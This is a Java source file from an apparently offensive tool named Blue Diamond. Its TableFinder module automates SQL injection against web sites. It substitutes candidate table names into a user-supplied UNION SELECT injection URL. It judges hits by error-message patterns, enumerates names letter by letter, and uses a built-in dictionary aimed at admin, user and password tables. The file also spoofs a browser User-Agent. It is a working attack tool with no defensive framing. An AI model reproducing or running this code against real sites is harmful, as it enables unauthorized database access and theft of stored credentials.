 /*
  * To change this template, choose Tools | Templates
  * and open the template in the editor.
  */
 package org.bluediamond.functionality;
 
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileReader;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Scanner;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 import org.bluediamond.BlueDiamond;
 import org.bluediamond.utilities.StringUtils;
 
 /**
  *
  * @author Abaco Team
  */
 public class TableFinder implements IFunctionality {
     private final static String DICT_FILENAME ="table.diz";
     private final static String NEXTLETTER_PATTERN ="abcdefghijklmnopqrstuvwxyz0123456789_-";
     private final static String TBL_PATTERN = "[TABLE]";
     private final static String[] DIC_TABLES = {  "admin",
                                             "admins",
                                             "administrator",
                                             "amministrazione",
                                             "account",
                                             "accnts",
                                             "accnt",
                                             "user_id",
                                             "accounts",
                                             "adminlogin",
                                             "auth",
                                             "authenticate",
                                             "authentication",
                                             "account",
                                             "access",
                                             "accesso",
                                             "customers",
                                             "customer",
                                             "gestione",
                                             "login",
                                             "logout",
                                             "loginout",
                                             "log",
                                             "member",
                                             "membri",
                                             "members",
                                             "memberid",
                                             "name",
                                             "operatori",
                                             "operatore",
                                             "password",
                                             "pass",
                                             "passwd",
                                             "passw",
                                             "pword",
                                             "pwrd",
                                             "pwd",
                                             "tbl_utenti",
                                             "usrs",
                                             "usr2",
                                             "users",
                                             "utenti",
                                             "Utenti",
                                             "Users",
                                             "User",
                                             "username",
                                             "user",
                                             "User",
                                             "user_name",
                                             "user_username",
                                             "uname",
                                             "user_uname",
                                             "usern",
                                             "user_usern",
                                             "user_un",
                                             "usrnm",
                                             "user_usrnm",
                                             "usr",
                                             "usernm",
                                             "user_usernm",
                                             "user_nm",
                                             "user_password",
                                             "userpass",
                                             "user_pass",
                                             "user_pword",
                                             "user_passw",
                                             "user_pwrd",
                                             "user_pwd",
                                             "user_passwd"
                                             
                                             };
     
     private String baseUrl;
     private String PatternError;
     private String tabPrefix;
     private int delayMS = 0;
     private boolean DEBUG = false;
     private boolean isError;
     
     private void Init(String Url,  String pattern_error, String tabPrefix, String debug)
     {
         this.DEBUG = debug.trim().equals("1");
         this.tabPrefix = (tabPrefix != null && tabPrefix.trim().length() > 0) ? tabPrefix : "";
         this.baseUrl = Url.replace(" ","%20");
         //this.baseUrl = Url.replace(" ","+");
         this.PatternError = pattern_error;
     }
 
     private ArrayList<String> sendSingleRequest(String table_name)
     {
         ArrayList<String> results=new ArrayList<String>();
         try
         {
             URL WebSite = new URL(this.baseUrl.replace(TBL_PATTERN, table_name));
             HttpURLConnection conn = (HttpURLConnection)WebSite.openConnection();
             conn.setRequestProperty("User-Agent", "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; H010818)");
             conn.setDoOutput(true);
             if(conn.getResponseCode() != 200)
             {
                 System.out.println("[-] NOT FOUND ("+conn.getResponseCode()+")"+table_name);
                 return results;
             }
             BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
             String line = "";
            String builder= "";//alcune response sono chunked e quindi hanno content-lenght == -1
             while ((line = rd.readLine()) != null)
                builder += line;
             rd.close();        
 
            String response=StringUtils.NoSpaces(builder.toLowerCase());
             String errorPat = StringUtils.NoSpaces(PatternError.toLowerCase());
             if(DEBUG)
                 System.out.println("DEBUG\n"+response);
             if(isError && response.contains(errorPat) || (!isError && !response.contains(errorPat)))
             {
                 if(DEBUG)
                     System.out.println("[-] NOT FOUND: " +table_name);
             }
             else
             {
                 System.out.println("[+] FOUND: " +table_name);
                 results.add(table_name);
             }
         }
         catch(Exception e)
         {
             e.printStackTrace();
         }
         return results;
     }
     
     private String getStartingPrefix()
     {
         System.out.print("Starting prefix: ");
         return BlueDiamond.getLine();
     }
     
     private void sleep()
     {        
             try {
                 Thread.sleep(delayMS);
             } catch (InterruptedException ex) {
             }
     }
     
     private void findNextLetter()
     {
         String prefix=getStartingPrefix();
         for(int i=0;i<NEXTLETTER_PATTERN.length();i++)
         {
             sendSingleRequest(prefix+NEXTLETTER_PATTERN.charAt(i));
             sleep();
         }
     }
     
     private ArrayList<String> partialNamesLoop(ArrayList<String> input)
     {
         ArrayList<String> result=new ArrayList<String>();
         
         for(String prefix : input)
         {
             for(int i=0;i<NEXTLETTER_PATTERN.length();i++)
             {
                 ArrayList<String> temp=sendSingleRequest(prefix+NEXTLETTER_PATTERN.charAt(i));
                 result.addAll(temp);
                 sleep();
             }
         }
         
         return result;
     }
     
     private void findPartialNames()
     {
         String prefix=getStartingPrefix();
         
         ArrayList<String> initial=new ArrayList<String>();
         initial.add(prefix);
         
         while(true)
         {
             initial=partialNamesLoop(initial);            
             if(initial.size()==0)
             {
                 System.out.println("No results!");
                 break;
             }
             System.out.println("Partial results:");
             for(String s : initial)
             {
                 System.out.print(String.format("%s, ", s));
             }
             System.out.print("\nContinue? (Y/N): ");
             String read=BlueDiamond.getLine().toUpperCase();
             if(!read.equals("Y"))
                 break;
         }
     }
     
     private static ArrayList loadFile(String fileName)
     {
         if ((fileName == null) || (fileName == ""))
             throw new IllegalArgumentException();
      
         File f = new File(fileName);
         if(!f.exists())
             return new ArrayList();
  
         String line;
         ArrayList file = new ArrayList();
 
         try
         {    
             BufferedReader in = new BufferedReader(new FileReader(fileName));
 
             if (!in.ready())
                 throw new IOException();
 
             while ((line = in.readLine()) != null)
                 file.add(line);
 
             in.close();
         }
         catch (IOException e)
         {
             System.out.println(e);
             return null;
         }
 
         return file;
     }
     
     private void findByDictionary()
     {
         List<String> dict=loadFile(DICT_FILENAME);
         if(dict==null || dict.size()==0)
         {
             dict=Arrays.asList(DIC_TABLES);            
         }
         
         for(String name : dict)
         {
               sendSingleRequest(name);
               sleep();
         }
 
     }
 
     @Override
     public String getName() {
         return "TableFinder";
     }
     
     private void setSiteInject() {
         String usage = "Please insert site to inject: [ex: http://www.site.com/index.php?id=-1 UNION SELECT 1,2,3 from [TABLE]]";
         System.out.println(usage);
         String site = BlueDiamond.getLine();
         
         if(site.length()>0)
         {
             site = site.replace(" ", "%20");
             if(!site.contains(TBL_PATTERN))
                 System.out.println("TBL PATTERN doesn't FOUND! : " +TBL_PATTERN);
 
             this.baseUrl = site; 
         }
     }
     
     private void setErrorPattern()
     {
         String usage= "Please insert discriminating pattern: [ex: Microsoft JET Database Engine]";
         System.out.println(usage);
         String error = BlueDiamond.getLine();
         if(error.length()>0)
         {
             usage= "Please insert 1 if pattern is for error";
             System.out.println(usage);
             String isError = BlueDiamond.getLine();        
             this.PatternError=error;
             this.isError=isError.equals("1");
         }               
     }
     
     private void setDelayMS()
     {
         String usage= "Please insert the delay in MS between two consecutive requests";
         System.out.println(usage);
         String delay = BlueDiamond.getLine();
         
         Integer del;
         try            
         {
             del=Integer.valueOf(delay);
         }
         catch(NumberFormatException e)
         {
             del=0;
         }
         
         if(del>0)
             delayMS=del;
     }
     
     private boolean menuLoop() {
         System.out.println("Blue Diamond - TableFinder\n");
         System.out.println("1) Find next letter (require table metadata query with like)");
         System.out.println("2) Find partial names (require table metadata query with like)");
         System.out.println("3) Find whole names by dictionary");
         System.out.println(String.format("\na) Change site to inject (%s)",baseUrl));
         System.out.println(String.format("b) Change the errror pattern (%s)",PatternError));
         System.out.println(String.format("c) Set the delay between request (%d ms)",delayMS));
         System.out.println((DEBUG ? "d) Disable Debug mode" : "d) Enable Debug mode"));
         System.out.println("e) Back to main menu!");
         System.out.print("Your choice: ");
         
         String choice=BlueDiamond.getLine();
         
         if(choice.equals("e"))
             return false;
         else if(choice.equals("a"))
             setSiteInject();
         else if(choice.equals("b"))
             setErrorPattern();
         else if(choice.equals("c"))
             setDelayMS();
         else if(choice.equals("d"))
             DEBUG = !DEBUG;
         else if(choice.equals("1"))
             findNextLetter();
         else if(choice.equals("2"))
             findPartialNames();
         else if(choice.equals("3"))
             findByDictionary();
             
         return true;
     }
 
     @Override
     public void run() {
         while(StringUtils.isEmpty(this.baseUrl))
             setSiteInject();
 
         while(StringUtils.isEmpty(this.PatternError))
             setErrorPattern();
 
         while(delayMS<=0)
             setDelayMS();
         
         while(menuLoop());
     }
 }
